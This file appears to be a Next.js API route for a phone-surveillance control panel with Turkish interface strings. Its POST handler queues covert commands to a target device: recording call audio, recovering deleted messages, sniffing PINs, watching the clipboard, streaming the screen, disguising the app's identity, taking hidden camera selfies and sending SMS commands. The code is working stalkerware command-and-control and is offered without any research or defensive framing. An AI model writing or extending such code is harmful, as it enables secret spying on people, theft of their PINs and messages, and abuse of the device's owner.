import { NextRequest, NextResponse } from 'next/server';
import { getIntelligenceStateFromDb, saveIntelligenceStateToDb, queueCommandInDb } from '@/lib/fleetDb';
import { 
  getIntelligenceHubState, 
  updateIntelligenceHubState, 
  queueDeviceCommand,
  addAuditLog,
  getDeviceById
} from '@/lib/telemetryStore';

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    
    let state: any = null;
    try {
      state = await getIntelligenceStateFromDb(id);
    } catch {
      state = getIntelligenceHubState(id);
    }
    if (!state) state = getIntelligenceHubState(id);

    const headers = {
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
      'Pragma': 'no-cache'
    };

    return NextResponse.json({ status: 'success', state }, { status: 200, headers });
  } catch (error: any) {
    return NextResponse.json({ status: 'error', message: error?.message }, { status: 500 });
  }
}

export async function POST(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    const body = await request.json();
    const action = body.action;

    let updatedState = getIntelligenceHubState(id);

    if (action === 'TOGGLE_FEATURE') {
      const { feature, enabled } = body;
      updatedState = updateIntelligenceHubState(id, { [feature]: enabled });
      try {
        await saveIntelligenceStateToDb(id, updatedState);
      } catch {}
      
      // Dispatch remote command to device
      if (feature === 'call_recording_active') {
        queueCommandInDb(id, 'RECORD_CALL_AUDIO', { enabled }).catch(() => queueDeviceCommand(id, 'RECORD_CALL_AUDIO', { enabled }));
      } else if (feature === 'deleted_msg_backup_active' || feature === 'backup_active') {
        queueCommandInDb(id, 'ENABLE_DELETED_MSG_CARVING', { enabled }).catch(() => queueDeviceCommand(id, 'ENABLE_DELETED_MSG_CARVING', { enabled }));
      } else if (feature === 'pin_verifier_active' || feature === 'pin_logging_active') {
        queueCommandInDb(id, 'ENABLE_PIN_SNIFFER', { enabled }).catch(() => queueDeviceCommand(id, 'ENABLE_PIN_SNIFFER', { enabled }));
      } else if (feature === 'clipboard_radar_active') {
        queueCommandInDb(id, 'ENABLE_CLIPBOARD_RADAR', { enabled }).catch(() => queueDeviceCommand(id, 'ENABLE_CLIPBOARD_RADAR', { enabled }));
      } else if (feature === 'turbo_stream_active') {
        queueCommandInDb(id, enabled ? 'START_TURBO_STREAM' : 'STOP_TURBO_STREAM', { fps: 30 }).catch(() => queueDeviceCommand(id, enabled ? 'START_TURBO_STREAM' : 'STOP_TURBO_STREAM', { fps: 30 }));
      }
    } else if (action === 'SET_CAMOUFLAGE') {
      const { camouflage } = body;
      updatedState = updateIntelligenceHubState(id, { current_camouflage: camouflage });
      try {
        await saveIntelligenceStateToDb(id, updatedState);
      } catch {}
      queueCommandInDb(id, 'SET_APP_CAMOUFLAGE', { camouflage_type: camouflage }).catch(() => queueDeviceCommand(id, 'SET_APP_CAMOUFLAGE', { camouflage_type: camouflage }));
    } else if (action === 'TRIGGER_INTRUDER_SELFIE') {
      queueCommandInDb(id, 'TRIGGER_INTRUDER_SELFIE', { quality: 90 }).catch(() => queueDeviceCommand(id, 'TRIGGER_INTRUDER_SELFIE', { quality: 90 }));
    } else if (action === 'SEND_SMS_COMMAND') {
      const { sms_command, phone_number } = body;

      // Log outgoing emergency SMS command
      addAuditLog({
        device_id: id,
        event_type: 'CALL_EVENT',
        package_name: 'com.android.mms',
        app_name: 'SMS Köprüsü',
        title: `📤 Çevrimdışı SMS Gönderildi -> ${phone_number}`,
        content: `Komut: ${sms_command}`,
      });
      queueDeviceCommand(id, 'SEND_SMS_COMMAND', { command: sms_command, phone: phone_number });
    }

    return NextResponse.json({ 
      status: 'success', 
      message: 'İstihbarat komutu uygulandı', 
      state: updatedState 
    }, { status: 200 });

  } catch (error: any) {
    return NextResponse.json({ status: 'error', message: error?.message }, { status: 500 });
  }
}
